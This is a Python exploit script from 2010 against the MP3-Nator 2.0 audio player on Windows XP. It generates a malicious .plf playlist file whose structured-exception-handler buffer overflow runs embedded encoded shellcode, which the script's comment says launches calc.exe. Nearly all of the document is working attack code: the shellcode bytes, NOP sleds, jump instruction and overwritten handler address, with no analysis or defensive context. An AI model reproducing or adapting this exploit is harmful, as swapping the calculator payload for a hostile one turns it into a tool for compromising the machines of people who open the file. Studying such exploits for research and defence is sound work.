#!usr/bin/python
#
#Exploit Title: Exploit Buffer Overflow MP3-Nator
#Date: 10\\11\\2010
#Author: C4SS!0 G0M3S
#Software Link: http://www.brothersoft.com/d.php?soft_id=16524&url=http%3A%2F%2Ffiles.brothersoft.com%2Fmp3_audio%2Fplayers%2Fmp3nator.zip
#Version: 2.0
#Tested on: WIN-XP SP3
#
#
#Writted By C4SS!0 G0M3S
#
#Home: http://wwww.google.com.br
#
#
#E-mail: Louredo_@hotmail.com
#
#
import os,sys

def layout():
    os.system(\"cls\")
    os.system(\"color 4f\")
    print(\"\\n[+]Exploit    :    Exploit Buffer Overflow MP3-NATOR v2.0\")
    print(\"[+]Author     :    C4SS!0 G0M3S\")
    print(\"[+]E-mail     :    Louredo_@hotmail.com\")
    print(\"[+]Home       :    http://www.invasao.com.br\")
    print(\"[+]Impact     :    Hich\")
    print(\"[+]Version    :    2.0\\n\")

if len(sys.argv)!=2:

    layout()
    print(\"[-]Usage: Exploit.py <File to Create>\")
    print(\"[-]Exemple: Exploit.py musics.plf\\n\")
    print(\"[-]Note: The Extension of the File Should be .plf for the Exploit Work\")
    
else:
    #Exec The Calc.exe
    buffer = (\"\\xeb\\x03\\x59\\xeb\\x05\\xe8\\xf8\\xff\\xff\\xff\\x4f\\x49\\x49\\x49\\x49\\x49\"
    \"\\x49\\x51\\x5a\\x56\\x54\\x58\\x36\\x33\\x30\\x56\\x58\\x34\\x41\\x30\\x42\\x36\"
    \"\\x48\\x48\\x30\\x42\\x33\\x30\\x42\\x43\\x56\\x58\\x32\\x42\\x44\\x42\\x48\\x34\"
    \"\\x41\\x32\\x41\\x44\\x30\\x41\\x44\\x54\\x42\\x44\\x51\\x42\\x30\\x41\\x44\\x41\"
    \"\\x56\\x58\\x34\\x5a\\x38\\x42\\x44\\x4a\\x4f\\x4d\\x4e\\x4f\\x4a\\x4e\\x46\\x44\"
    \"\\x42\\x30\\x42\\x50\\x42\\x30\\x4b\\x48\\x45\\x54\\x4e\\x43\\x4b\\x38\\x4e\\x47\"  
    \"\\x45\\x50\\x4a\\x57\\x41\\x30\\x4f\\x4e\\x4b\\x58\\x4f\\x54\\x4a\\x41\\x4b\\x38\"
    \"\\x4f\\x45\\x42\\x42\\x41\\x50\\x4b\\x4e\\x49\\x44\\x4b\\x38\\x46\\x33\\x4b\\x48\"
    \"\\x41\\x50\\x50\\x4e\\x41\\x53\\x42\\x4c\\x49\\x59\\x4e\\x4a\\x46\\x58\\x42\\x4c\"
    \"\\x46\\x57\\x47\\x30\\x41\\x4c\\x4c\\x4c\\x4d\\x30\\x41\\x30\\x44\\x4c\\x4b\\x4e\"
    \"\\x46\\x4f\\x4b\\x53\\x46\\x55\\x46\\x32\\x46\\x50\\x45\\x47\\x45\\x4e\\x4b\\x58\"
    \"\\x4f\\x45\\x46\\x52\\x41\\x50\\x4b\\x4e\\x48\\x56\\x4b\\x58\\x4e\\x50\\x4b\\x44\"
    \"\\x4b\\x48\\x4f\\x55\\x4e\\x41\\x41\\x30\\x4b\\x4e\\x4b\\x58\\x4e\\x41\\x4b\\x38\"
    \"\\x41\\x50\\x4b\\x4e\\x49\\x48\\x4e\\x45\\x46\\x32\\x46\\x50\\x43\\x4c\\x41\\x33\"
    \"\\x42\\x4c\\x46\\x46\\x4b\\x38\\x42\\x44\\x42\\x53\\x45\\x38\\x42\\x4c\\x4a\\x47\"
    \"\\x4e\\x30\\x4b\\x48\\x42\\x44\\x4e\\x50\\x4b\\x58\\x42\\x37\\x4e\\x51\\x4d\\x4a\"
    \"\\x4b\\x48\\x4a\\x36\\x4a\\x30\\x4b\\x4e\\x49\\x50\\x4b\\x38\\x42\\x58\\x42\\x4b\"
    \"\\x42\\x50\\x42\\x50\\x42\\x50\\x4b\\x38\\x4a\\x36\\x4e\\x43\\x4f\\x45\\x41\\x53\"
    \"\\x48\\x4f\\x42\\x46\\x48\\x35\\x49\\x38\\x4a\\x4f\\x43\\x48\\x42\\x4c\\x4b\\x57\"
    \"\\x42\\x45\\x4a\\x36\\x42\\x4f\\x4c\\x38\\x46\\x30\\x4f\\x35\\x4a\\x46\\x4a\\x39\"
    \"\\x50\\x4f\\x4c\\x38\\x50\\x50\\x47\\x55\\x4f\\x4f\\x47\\x4e\\x43\\x46\\x41\\x46\"
    \"\\x4e\\x46\\x43\\x36\\x42\\x50\\x5a\")

    nseh=\"\\x90\\x90\\xeb\\xf6\"
    seh=\"\\x1a\\xab\\x51\\x00\"
    nops=\"\\x90\" * 3000
    nops2=\"\\x90\" * 760
    shell=\"\\xcc\" * 600
    jmp=\"\\xe8\\x5b\\xfb\\xff\\xff\" #Jmp From Start The My Shellcode 
    file=str(sys.argv[1])
    
    op=\"w\"
    try:
        f=open(file,op)
        f.write(nops+buffer+nops2+jmp+nseh+seh+shell)
        f.close()
        layout()
        print(\"[+]Creating File: \"+file)
        print(\"[+]Identifying Shellcode length\")
        print(\"[+]The Length of Your Shellcode:\"+str(len(buffer)))
        print(\"[+]File \"+file+\" Created Successfully\")
    except IOError:
        print(\"[+]Error in Create The File\")
